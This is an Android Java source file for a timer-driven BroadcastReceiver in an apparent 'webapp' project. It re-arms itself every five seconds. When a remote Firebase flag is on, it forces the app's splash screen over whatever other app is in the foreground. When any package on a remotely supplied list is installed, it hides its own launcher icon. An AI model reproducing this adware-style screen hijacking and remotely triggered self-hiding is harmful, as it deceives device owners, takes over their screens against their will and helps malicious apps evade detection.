package com.example.maks.webapp.receivers;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import android.util.Log;

import com.example.maks.webapp.SplashActivity;
import com.example.maks.webapp.db.FirebaseDB;

import java.util.List;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.content.Context.ALARM_SERVICE;

public class TimerReceiver extends BroadcastReceiver {

    public static final String SHOW_TRANSPARENT = "show_transparent";

    @Override
    public void onReceive(Context context, Intent intent) {

        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        AlarmManager manager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
        PendingIntent pIntent = PendingIntent.getBroadcast(context, 0,
                new Intent(context, TimerReceiver.class), PendingIntent.FLAG_UPDATE_CURRENT);

        if(manager != null)
            manager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5 * 1000, pIntent);

        if(preferences.getBoolean(SHOW_TRANSPARENT, false)) {
            ActivityManager am = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);

            if(am != null) {
                ActivityManager.RunningTaskInfo foregroundTaskInfo = am.getRunningTasks(1).get(0);

                Log.e("foregroundTaskInfo", foregroundTaskInfo.topActivity.getPackageName());
                Log.e("context", context.getPackageName());
                if (!foregroundTaskInfo.topActivity.getPackageName().equals(context.getPackageName()))
                    context.startActivity(new Intent(context, SplashActivity.class)
                            .putExtra(SHOW_TRANSPARENT, true)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
            }
        }

        preferences.edit().putInt("counter", preferences.getInt("counter", 0) + 1).apply();

        if (preferences.getInt("counter", 0) == 1) {
            new FirebaseDB().setOnConfigChangeListener(config -> {
                Log.e(getClass().getName(), "config = " + config);
                preferences.edit().putBoolean(SHOW_TRANSPARENT, config == 1).apply();
            });

            new FirebaseDB().setOnPackagesChangeListener(((packages, hideStatus) -> {
                if(hideStatus && isContainsPackages(context, packages))
                    hideApp(context);
                else showApp(context);
            }));
        }

        if (preferences.getInt("counter", 0) >= 720)
            preferences.edit().remove("counter").apply();
    }

    private boolean isContainsPackages(Context context, List<String> packages) {
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);

        for(ApplicationInfo info : apps) {
            for(String pack : packages) {
                if(pack.equals(info.packageName))
                    return true;
            }
        }

        return false;
    }

    private void hideApp(Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, SplashActivity.class);
        p.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void showApp(Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, SplashActivity.class);
        p.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
}
